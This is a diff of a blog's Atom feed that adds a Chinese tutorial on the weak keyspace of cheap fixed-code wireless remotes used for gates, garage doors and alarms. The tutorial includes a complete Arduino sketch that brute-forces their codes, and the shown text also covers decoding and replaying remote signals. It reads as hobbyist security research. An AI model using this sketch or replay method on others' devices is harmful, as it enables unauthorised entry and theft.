@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://blog.iternull.com/"/>
-  <updated>2017-02-04T14:29:41.494Z</updated>
+  <updated>2017-02-05T20:28:11.502Z</updated>
   <id>https://blog.iternull.com/</id>
   
   <author>
@@ -14,6 +14,85 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>对硬件安全的一些看法</title>
+    <link href="https://blog.iternull.com/posts/2017/02/06/Some-views-on-hardware-security.html"/>
+    <id>https://blog.iternull.com/posts/2017/02/06/Some-views-on-hardware-security.html</id>
+    <published>2017-02-05T20:23:09.000Z</published>
+    <updated>2017-02-05T20:28:11.502Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+      <category term="想法" scheme="https://blog.iternull.com/tags/%E6%83%B3%E6%B3%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>分析无线遥控器信号并制作 Hack 硬件进行攻击</title>
+    <link href="https://blog.iternull.com/posts/2017/02/04/Use-Arduino-brute-force-to-attack-remote-control.html"/>
+    <id>https://blog.iternull.com/posts/2017/02/04/Use-Arduino-brute-force-to-attack-remote-control.html</id>
+    <published>2017-02-04T14:32:46.000Z</published>
+    <updated>2017-02-06T07:27:06.523Z</updated>
+    
+    <content type="html"><![CDATA[<p>无线遥控器（无线电遥控器）在我们生活中非常常见，应用于各种场景，方便着用户的使用。不过大多数还是用于安防方面的，比如: 遥控报警器、电动卷帘门、电动伸缩门、遥控电开关、无线遥控门铃……<br>不过国内关注和研究这类硬件安全的人比较少，我知道你们大多都是 Web 安全狗，我挖洞挖不过你们所以做了一只硬件安全狗。<br><a id="more"></a></p>
+<h2 id="1、无线遥控器简介"><a href="#1、无线遥控器简介" class="headerlink" title="1、无线遥控器简介"></a>1、无线遥控器简介</h2><p>无线遥控器从安全角度看大致分为两类，一类是最普遍的固定码遥控器，特点是廉价、应用广泛、市场大、用户多；另一类是滚动码遥控器，特点是价格较贵、相对比较安全、用于汽车安全防盗等安全要求较高的地方。</p>
+<p>固定码遥控器有很多种编码方式，国内常见的是 3 态 8 位的编码或者厂商出厂时烧录的随机码。滚动码这里不做讲解，我都还得到这类遥控器，滚动码相对来说比较安全，但也并非绝对安全，你的汽车用到就是滚动码遥控器，然而盗贼在 N 年前就能买到干扰破解你汽车防盗的设备了。</p>
+<p>无线遥控器从信号调制方式可以大致分成 <a href="https://en.wikipedia.org/wiki/On-off_keying" target="_blank" rel="external">OOK</a> 和 <a href="https://en.wikipedia.org/wiki/Frequency-shift_keying" target="_blank" rel="external">FSK</a> 两种方式，当然这只是常见的，还有其他的信号调制方式。</p>
+<h2 id="2、三态八位遥控器"><a href="#2、三态八位遥控器" class="headerlink" title="2、三态八位遥控器"></a>2、三态八位遥控器</h2><p>3 态 8 位遥控器是我们常见的遥控器，它属于固定码遥控器。在电瓶车防盗器、电动卷帘门、电动伸缩门、遥控电开关、无线遥控门铃这些应用中都能见到这种遥控器，因为这种遥控器很廉价。</p>
+<h3 id="2-1-什么是三态八位遥控器？"><a href="#2-1-什么是三态八位遥控器？" class="headerlink" title="2.1 什么是三态八位遥控器？"></a>2.1 什么是三态八位遥控器？</h3><p>3 态 8 位遥控器顾名思义，它有 3 种码位状态 8 个码位。二进制是由 <code>0</code> 和 <code>1</code> 组成的，所以 2 位(bit)长的二进制有 4 种可能性 <code>00</code> <code>01</code> <code>10</code> <code>11</code> ， 3 态 8 位遥控器使用的是这其中的 3 种 <code>00</code> <code>01</code> <code>11</code> 这是 3 态。<br>8 位是指有 8 个编码位，每个编码位可使用 3 态中的任意一种，所以是 <code>2 * 8 = 16</code> 总共 16 位(bit)长的二进制，但是常见的无线遥控器是的数据长度是 24 位(bit)，因为后 8 位(bit)是定义按键值的（如果你对信号解码出来的是 25 位(bit)长，你可以除去末尾的 <code>0</code> ；如果是 25 位(bit)长，末尾的是 <code>1</code> 这可能是你解码错了）。<br>常见的 4 键遥控器的的每个键值都是出厂就固定了的，分别是 <code>11000000</code> <code>00110000</code> <code>00001100</code> <code>00000011</code></p>
+<h3 id="2-2-厂商烧录的固定码"><a href="#2-2-厂商烧录的固定码" class="headerlink" title="2.2 厂商烧录的固定码"></a>2.2 厂商烧录的固定码</h3><p>如果你的固定码遥控器解码后的二进制中有一对 <code>10</code> 码（注意是一对，前一对的后 <code>1</code> 跟后一对的前 <code>0</code> 组成的 <code>10</code> 是不算的）这说明你的遥控器不属于 3 态 8 位遥控器，是厂商出厂时烧录的固定码，这种遥控器的后 8 位(bit)按键值也不一定是标准的 4 种可能性。</p>
+<p>这类固定码遥控器的接收端一般都是学习行的，会有一个学习键。作用是配对新的遥控器，如果当前遥控器坏了，你可以买个同类型的遥控器，长按学习键再按遥控器，就可以学习到新遥控器的编码的信息，这样你就能继续使用了。</p>
+<h3 id="2-3-辨别是否是三态八位"><a href="#2-3-辨别是否是三态八位" class="headerlink" title="2.3 辨别是否是三态八位"></a>2.3 辨别是否是三态八位</h3><p>辨别是否是 3 态 8 位遥控器最靠谱的方法就是拆开来看 PCB 板子，有 3 排 8 列焊盘的肯定是，否则就不是，使用 3 态 8 位拨码开关的也是。</p>
+<p><img src="/data/images/2017-02-04_01-0001.png" alt=""></p>
+<h3 id="2-4-三态八位遥控器编码"><a href="#2-4-三态八位遥控器编码" class="headerlink" title="2.4 三态八位遥控器编码"></a>2.4 三态八位遥控器编码</h3><p>国内常见的编码方法都是直接焊接 PCB 上的焊盘，极少使用拨码开关，节省成本？当然你也能买到 3 态 8 位的拨码遥控器。</p>
+<p><img src="/data/images/2017-02-04_01-0002.png" alt=""></p>
+<p>从上图中可以看出总共有 3 排 8 列焊盘，这也就是 3 态（上中下） 8 位的定义方式。中间的一排连接的是芯片的引脚，当芯片的一个引脚与 High 焊接上后产生的编码是 <code>11</code> 与 Low 焊接上后产生的编码是 <code>00</code> 不焊接的默认编码是 <code>01</code> 。</p>
+<p>编码是成对的，遥控器上是这个编码，接收器上也得是这个编码否则是没法使用的。</p>
+<h2 id="3、分析安全缺陷"><a href="#3、分析安全缺陷" class="headerlink" title="3、分析安全缺陷"></a>3、分析安全缺陷</h2><p>从上文中我们知道了遥控器的二进制编码长度是 24 位(bit)，前 16 位(bit)是由 3 态 8 位编码方式定义的，后 8 位(bit)是厂商固定死的的按键值。一个遥控器上的每个按键的前 16 位(bit)都是一样的，后 8 位(bit)是不一样的，就 4 种可能性。<br>假设如果每个按键都是没有规律的随机码，那么你想通过暴力穷举出正确的编码，你需要尝试 <code>2 ^ 24 = 16777216</code> 总共 16777216 种可能性。<br>假设后 8 位(bit)是固定的 4 种可能性，前 16 位(bit)是随机的，那你只需要尝试前 16 位(bit)的所有可能性在拼接上后 8 位(bit)的固定值，你需要尝试 <code>2 ^ 16 = 65536</code> <code>4 ^ 8 = 65536</code> 每个按键总共 65536 种可能性。<br>由于 3 态 8 位里是没有 <code>10</code> 码的，所有你需要尝试的次数是 <code>3 ^ 8 = 6561</code> 每个按键总共 6561 种可能性。</p>
+<p>知道了暴力穷举攻击需要尝试的次数后我们再来算一下需要的时间，我对一个普通的遥控器做信号发送的采集，10 秒钟时间内我在接收端收到一百零几次遥控信号，也就是说一分钟至少可以发送（尝试） 600 个可能性。<br>尝试 24 位(bit)长度的所有组合所需的时间是 <code>16777216 / 600 = 27962</code> 27962 分钟左右，大概 20 天不到。尝试 16 位(bit)长度一个按键的所有组合所需的时间是 <code>65536 / 600 = 109</code> 109 分钟左右，大概一个多小时。<br>尝试 3 态 8 位一个按键的所有组合所需的时间是 <code>6561 / 600 = 11</code> 大概 11 分钟左右！！</p>
+<p>那么 <a href="https://samy.pl/" target="_blank" rel="external">Samy Kamkar</a> 在 8 秒内打开车库门的 <a href="http://samy.pl/opensesame/" target="_blank" rel="external">OpenSesame</a> 项目是怎么做到的？<br>首先 Samy Kamkar 的那个车库门的遥控器并非是 3 态 8 位的，编码长度好像只有 12 位(bit)， <code>2 ^ 12 = 4096</code> 总共 4096 种组合。<br>最关键是遥控设备的接收端使用的是<a href="https://en.wikipedia.org/wiki/Shift_register" target="_blank" rel="external">移位寄存器</a>，所以使用 <a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence" target="_blank" rel="external">De Bruijn 序列</a> 即可在非常短的时间内完成所有可能性的尝试。</p>
+<p>但我们常见的 3 态 8 位遥控设备的接收端用得并非是移位寄存器，所以没法使用 De Bruijn 序列实现暴力穷举攻击。检测接收端是否使用了移位寄存器的一个方法是在正确的编码前加个 <code>0</code> 。<br>如果使用了移位寄存器，那么会跳过错误的一个位(bit)检查下一个正确的，并给予响应。如果没使用移位寄存器，那么什么反应都没有，因为你发送的这个编码是错误的。</p>
+<h2 id="4、制作-Hacking-硬件"><a href="#4、制作-Hacking-硬件" class="headerlink" title="4、制作 Hacking 硬件"></a>4、制作 Hacking 硬件</h2><p>从上面理论分析中我们知道了这种遥控设备所存在的其中一个缺陷，要尝试利用这个缺陷实现对设备的攻击方法不止一种。你可以抱着你的笔记本和 SDR 设备去攻击它，或者我们尝试制作自己的便捷式硬件来利用这个缺陷实现对设备的攻击。</p>
+<p>这个我们使用 Arduino 和 RF 模块实现攻击功能。使用 Arduino 是因为廉价、易上手，当然你有能力的话也可以使用其他单片机去实现，或者自己设计电路，使用更好的 CC1111 芯片去实现 RF 功能。</p>
+<h3 id="4-1-硬件列表"><a href="#4-1-硬件列表" class="headerlink" title="4.1 硬件列表"></a>4.1 硬件列表</h3><ol>
+<li>Arduino Pro Micro</li>
+<li>315 MHz or 433 MHz 无线模块</li>
+<li>轻触按钮</li>
+<li>10 K 电阻</li>
+<li>面包板</li>
+<li>面包板跳线</li>
+</ol>
+<h3 id="4-2-硬件连接方式"><a href="#4-2-硬件连接方式" class="headerlink" title="4.2 硬件连接方式"></a>4.2 硬件连接方式</h3><p><img src="/data/images/2017-02-04_01-0003.png" alt=""><br><img src="/data/images/2017-02-04_01-0004.jpg" alt=""></p>
+<h3 id="4-3-功能代码"><a href="#4-3-功能代码" class="headerlink" title="4.3 功能代码"></a>4.3 功能代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line">  Brute Force Attack 4 ^ 8 Remote Control</div><div class="line">  </div><div class="line">  https://github.com/ZMOM1031/bruteforce3-8remote</div><div class="line">  </div><div class="line">*/</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;RCSwitch.h&gt;</span></span></div><div class="line"></div><div class="line">RCSwitch mySwitch = RCSwitch();</div><div class="line"></div><div class="line"><span class="comment">// 定义 4 个按键针脚</span></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> button_a = <span class="number">10</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> button_b = <span class="number">16</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> button_c = <span class="number">14</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> button_d = <span class="number">15</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> butStatA = <span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> butStatB = <span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> butStatC = <span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> butStatD = <span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> dfa = <span class="number">256</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</div><div class="line"></div><div class="line">  Serial.begin(<span class="number">9600</span>);</div><div class="line">  </div><div class="line">  mySwitch.enableTransmit(<span class="number">9</span>);    <span class="comment">// 定义发送模块的数据传输针脚</span></div><div class="line">  mySwitch.setPulseLength(<span class="number">170</span>);   <span class="comment">// 定义脉冲长度，这个值具体看你使用的遥控器而定</span></div><div class="line">  pinMode(button_a, INPUT);</div><div class="line">  pinMode(button_b, INPUT);</div><div class="line">  pinMode(button_c, INPUT);</div><div class="line">  pinMode(button_d, INPUT);</div><div class="line">  </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</div><div class="line"></div><div class="line">  <span class="comment">// read the state of the pushbutton value:</span></div><div class="line">  butStatA = digitalRead(button_a);</div><div class="line">  butStatB = digitalRead(button_b);</div><div class="line">  butStatC = digitalRead(button_c);</div><div class="line">  butStatD = digitalRead(button_d);</div><div class="line"></div><div class="line">  <span class="comment">// Button A</span></div><div class="line">  <span class="keyword">if</span> (butStatA == HIGH) &#123;    <span class="comment">// check if the pushbutton is pressed.</span></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">long</span> i = <span class="number">0</span>; i &lt; <span class="number">65535</span>; i++ )&#123;</div><div class="line">      <span class="keyword">long</span> key = <span class="keyword">long</span>(i * dfa) + <span class="keyword">int</span>(<span class="number">192</span>);</div><div class="line">      mySwitch.send(key, <span class="number">24</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  <span class="comment">// Button B</span></div><div class="line">  <span class="keyword">if</span> (butStatB == HIGH) &#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">long</span> i = <span class="number">0</span>; i &lt; <span class="number">65535</span>; i++ )&#123;</div><div class="line">      <span class="keyword">long</span> key = <span class="keyword">long</span>(i * dfa) + <span class="keyword">int</span>(<span class="number">48</span>);</div><div class="line">      mySwitch.send(key, <span class="number">24</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  <span class="comment">// Button C</span></div><div class="line">  <span class="keyword">if</span> (butStatC == HIGH) &#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">long</span> i = <span class="number">0</span>; i &lt; <span class="number">65535</span>; i++ )&#123;</div><div class="line">      <span class="keyword">long</span> key = <span class="keyword">long</span>(i * dfa) + <span class="keyword">int</span>(<span class="number">12</span>);</div><div class="line">      mySwitch.send(key, <span class="number">24</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  <span class="comment">// Button D</span></div><div class="line">  <span class="keyword">if</span> (butStatD == HIGH) &#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">long</span> i = <span class="number">0</span>; i &lt; <span class="number">65535</span>; i++ )&#123;</div><div class="line">      <span class="keyword">long</span> key = <span class="keyword">long</span>(i * dfa) + <span class="keyword">int</span>(<span class="number">3</span>);</div><div class="line">      mySwitch.send(key, <span class="number">24</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<ul>
+<li>注：这段代码实现的是发送 <code>4 ^ 8</code> 的所有可能性。</li>
+</ul>
+<p>生成 <code>3 ^ 8</code> 的所有可能性的算法我还没实现，暂时也没时间去继续研究如何实现了，<strong>过完年得去找工作了</strong>。</p>
+<h2 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h2><p>在实际测试中暴力穷举攻击确实是有效的，但由于时间匆忙，硬件设计和代码都不是最优化的，所攻击的速度还是差了点。如果你使用的是这种类型的遥控设备也不用担心会这么样。</p>
+<p><a href="https://github.com/ZMOM1031/bruteforce3-8remote" target="_blank" rel="external">bruteforce3-8remote</a> 这个项目后续还会更新，争取达到最高的可用度，还会再加一些功能。<br>目前我得先去忙着找工作，才是正事。未来还会研究一些其他的硬件安全的破解/逆向项目的。</p>
+<p>最后感谢一下我的一位小伙伴（匿名）给的一些帮助。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;无线遥控器（无线电遥控器）在我们生活中非常常见，应用于各种场景，方便着用户的使用。不过大多数还是用于安防方面的，比如: 遥控报警器、电动卷帘门、电动伸缩门、遥控电开关、无线遥控门铃……&lt;br&gt;不过国内关注和研究这类硬件安全的人比较少，我知道你们大多都是 Web 安全狗，我挖洞挖不过你们所以做了一只硬件安全狗。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="Attack" scheme="https://blog.iternull.com/tags/Attack/"/>
+    
+      <category term="433 MHz" scheme="https://blog.iternull.com/tags/433-MHz/"/>
+    
+      <category term="Arduino" scheme="https://blog.iternull.com/tags/Arduino/"/>
+    
+      <category term="Brute Force" scheme="https://blog.iternull.com/tags/Brute-Force/"/>
+    
+  </entry>
   
   <entry>
     <title>解码无线遥控器信号的 N 种方法</title>
@@ -62,32 +141,32 @@
     <link href="https://blog.iternull.com/posts/2017/01/29/Use-the-Arduino-and-RC-Switch-reverse-remote-controls.html"/>
     <id>https://blog.iternull.com/posts/2017/01/29/Use-the-Arduino-and-RC-Switch-reverse-remote-controls.html</id>
     <published>2017-01-29T09:07:41.000Z</published>
-    <updated>2017-01-29T18:56:27.369Z</updated>
+    <updated>2017-02-04T21:34:50.568Z</updated>
     
     <content type="html"><![CDATA[<p>我们平常对遥控器信号的截取、分析、重放，一般用得都是 SDR 设备，常见的有 R820T2+RTL2832U, CC1111EMK, Yardstick One, HackRF One ……<br>其中 R820T2+RTL2832U 电视棒是最廉价的 SDR 设备，35 人民币左右就能得到，其余的都是比较昂贵的设备。不过使用电视棒你只能接收信号，不能发送信号。</p>
 <p>这里我们使用更廉价的设备（Arduino + 315 or 433 MHz 超再生模块）来实现对常见固定码遥控器信号的分析与重放。<br><a id="more"></a><br>常见型号的 Arduino 开发板都可以支持，无线模块建议不同频段的多买几对，价格也不贵。</p>
-<h2 id="1、接收-解码信号"><a href="#1、接收-解码信号" class="headerlink" title="1、接收/解码信号"></a>1、接收/解码信号</h2><p>这里我们使用 RC Switch 库接收和解码信号。</p>
-<h3 id="1-安装-RC-Switch-库"><a href="#1-安装-RC-Switch-库" class="headerlink" title="1. 安装 RC Switch 库"></a>1. 安装 RC Switch 库</h3><p>打开 Arduino IDE ，在选项栏 项目 &gt; 加载库 &gt; 管理库 里打开库管理器，搜索 <code>rc switch</code> 并安装它。</p>
+<h2 id="1、接收-解码信号"><a href="#1、接收-解码信号" class="headerlink" title="1、接收/解码信号"></a>1、接收/解码信号</h2><p>这里我们使用 <a href="https://github.com/sui77/rc-switch" target="_blank" rel="external">RC Switch</a> 库接收和解码信号。</p>
+<h3 id="1-1-安装-RC-Switch-库"><a href="#1-1-安装-RC-Switch-库" class="headerlink" title="1.1 安装 RC Switch 库"></a>1.1 安装 RC Switch 库</h3><p>打开 Arduino IDE ，在选项栏 项目 &gt; 加载库 &gt; 管理库 里打开库管理器，搜索 <code>rc switch</code> 并安装它。</p>
 <p><img src="/data/images/2017-01-29_01-0001.png" alt=""></p>
-<h3 id="2-连接-Arduino-和接收模块"><a href="#2-连接-Arduino-和接收模块" class="headerlink" title="2. 连接 Arduino 和接收模块"></a>2. 连接 Arduino 和接收模块</h3><p><img src="/data/images/2017-01-29_01-0002.png" alt=""></p>
+<h3 id="1-2-连接-Arduino-和接收模块"><a href="#1-2-连接-Arduino-和接收模块" class="headerlink" title="1.2 连接 Arduino 和接收模块"></a>1.2 连接 Arduino 和接收模块</h3><p><img src="/data/images/2017-01-29_01-0002.png" alt=""></p>
 <p>使用数据线连接 Arduino 到电脑，并在 Arduino IDE 里选择对应的板和端口号。</p>
 <p><img src="/data/images/2017-01-29_01-0003.png" alt=""></p>
-<h3 id="3-上传代码"><a href="#3-上传代码" class="headerlink" title="3. 上传代码"></a>3. 上传代码</h3><p>打开信号接收的示例代码。在选项栏 文件 &gt; 示例 &gt; rc-switch &gt; ReceiveDemo_Simple</p>
+<h3 id="1-3-上传代码"><a href="#1-3-上传代码" class="headerlink" title="1.3 上传代码"></a>1.3 上传代码</h3><p>打开信号接收的示例代码。在选项栏 文件 &gt; 示例 &gt; rc-switch &gt; ReceiveDemo_Simple</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line">  Simple example for receiving</div><div class="line">  </div><div class="line">  https://github.com/sui77/rc-switch/</div><div class="line">*/</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;RCSwitch.h&gt;</span></span></div><div class="line"></div><div class="line">RCSwitch mySwitch = RCSwitch();</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</div><div class="line">  Serial.begin(<span class="number">9600</span>);</div><div class="line">  mySwitch.enableReceive(<span class="number">0</span>);  <span class="comment">// Receiver on interrupt 0 =&gt; that is pin #2</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</div><div class="line">  <span class="keyword">if</span> (mySwitch.available()) &#123;</div><div class="line">    </div><div class="line">    <span class="keyword">int</span> value = mySwitch.getReceivedValue();</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> (value == <span class="number">0</span>) &#123;</div><div class="line">      Serial.print(<span class="string">"Unknown encoding"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      Serial.print(<span class="string">"Received "</span>);</div><div class="line">      Serial.print( mySwitch.getReceivedValue() );</div><div class="line">      Serial.print(<span class="string">" / "</span>);</div><div class="line">      Serial.print( mySwitch.getReceivedBitlength() );</div><div class="line">      Serial.print(<span class="string">"bit "</span>);</div><div class="line">      Serial.print(<span class="string">"Protocol: "</span>);</div><div class="line">      Serial.println( mySwitch.getReceivedProtocol() );</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    mySwitch.resetAvailable();</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>点击上传，上传代码到 Arduino</p>
 <p><img src="/data/images/2017-01-29_01-0004.png" alt=""></p>
 <p>想要注意的一点，在 <code>void setup()</code> 里有一行代码是定义数据接收的针脚的，不同的 Arduino 版本针脚不一样，如果接错线会导致 Arduino 没法正常工作，具体可以参考 Arduino 的文档。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mySwitch.enableReceive(<span class="number">0</span>);  <span class="comment">// Receiver on interrupt 0 =&gt; that is pin #2</span></div></pre></td></tr></table></figure>
-<h3 id="4-查看信号解码"><a href="#4-查看信号解码" class="headerlink" title="4. 查看信号解码"></a>4. 查看信号解码</h3><p>打开串口监视器。在选项栏 工具 &gt; 串口监视器 或者按快捷键 <code>Ctrl + Shift + M</code></p>
+<h3 id="1-4-查看信号解码"><a href="#1-4-查看信号解码" class="headerlink" title="1.4 查看信号解码"></a>1.4 查看信号解码</h3><p>打开串口监视器。在选项栏 工具 &gt; 串口监视器 或者按快捷键 <code>Ctrl + Shift + M</code></p>
 <p>然后你可以按下遥控器，Arduino 会解码它，并在串口监视器上显示出你按下的按键所发送的代码。</p>
 <p><img src="/data/images/2017-01-29_01-0005.png" alt=""></p>
 <h2 id="2、重放信号"><a href="#2、重放信号" class="headerlink" title="2、重放信号"></a>2、重放信号</h2><p>当你知道了信号的代码后你就可以对它进行信号的重放。</p>
-<h3 id="1-连接-Arduino-和发送模块"><a href="#1-连接-Arduino-和发送模块" class="headerlink" title="1. 连接 Arduino 和发送模块"></a>1. 连接 Arduino 和发送模块</h3><p><img src="/data/images/2017-01-29_01-0006.png" alt=""></p>
-<h3 id="2-修改示例代码"><a href="#2-修改示例代码" class="headerlink" title="2. 修改示例代码"></a>2. 修改示例代码</h3><p>打开信号发送的示例代码。在选项栏 文件 &gt; 示例 &gt; rc-switch &gt; SendDemo</p>
+<h3 id="2-1-连接-Arduino-和发送模块"><a href="#2-1-连接-Arduino-和发送模块" class="headerlink" title="2.1 连接 Arduino 和发送模块"></a>2.1 连接 Arduino 和发送模块</h3><p><img src="/data/images/2017-01-29_01-0006.png" alt=""></p>
+<h3 id="2-2-修改示例代码"><a href="#2-2-修改示例代码" class="headerlink" title="2.2 修改示例代码"></a>2.2 修改示例代码</h3><p>打开信号发送的示例代码。在选项栏 文件 &gt; 示例 &gt; rc-switch &gt; SendDemo</p>
 <p>示例代码里有好几种发送选项，和好几个被注释的发送参数。</p>
 <p>这里我们使用十进制的发送方式。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line">  Example for different sending methods</div><div class="line">  </div><div class="line">  https://github.com/sui77/rc-switch/</div><div class="line">  </div><div class="line">*/</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;RCSwitch.h&gt;</span></span></div><div class="line"></div><div class="line">RCSwitch mySwitch = RCSwitch();</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</div><div class="line"></div><div class="line">  Serial.begin(<span class="number">9600</span>);</div><div class="line">  </div><div class="line">  <span class="comment">// Transmitter is connected to Arduino Pin #10  </span></div><div class="line">  mySwitch.enableTransmit(<span class="number">10</span>);</div><div class="line"></div><div class="line">  <span class="comment">// Optional set pulse length.</span></div><div class="line">  <span class="comment">// mySwitch.setPulseLength(320);</span></div><div class="line">  </div><div class="line">  <span class="comment">// Optional set protocol (default is 1, will work for most outlets)</span></div><div class="line">  <span class="comment">// mySwitch.setProtocol(2);</span></div><div class="line">  </div><div class="line">  <span class="comment">// Optional set number of transmission repetitions.</span></div><div class="line">  <span class="comment">// mySwitch.setRepeatTransmit(15);</span></div><div class="line">  </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</div><div class="line"></div><div class="line">  <span class="comment">/* See Example: TypeA_WithDIPSwitches */</span></div><div class="line">  <span class="comment">/*</span></div><div class="line">  mySwitch.switchOn("11111", "00010");</div><div class="line">  delay(1000);</div><div class="line">  mySwitch.switchOff("11111", "00010");</div><div class="line">  delay(1000);</div><div class="line">  */</div><div class="line"></div><div class="line">  <span class="comment">/* Same switch as above, but using decimal code */</span></div><div class="line">  mySwitch.send(<span class="number">5393</span>, <span class="number">24</span>);  <span class="comment">// 5393 表示发送的信号代码， 24 表示数据长度。</span></div><div class="line">  delay(<span class="number">1000</span>);              <span class="comment">// 暂停 1000 毫秒后再执行下一行代码。</span></div><div class="line">  mySwitch.send(<span class="number">5396</span>, <span class="number">24</span>);</div><div class="line">  delay(<span class="number">1000</span>);  </div><div class="line"></div><div class="line">  <span class="comment">/* Same switch as above, but using binary code */</span></div><div class="line">  <span 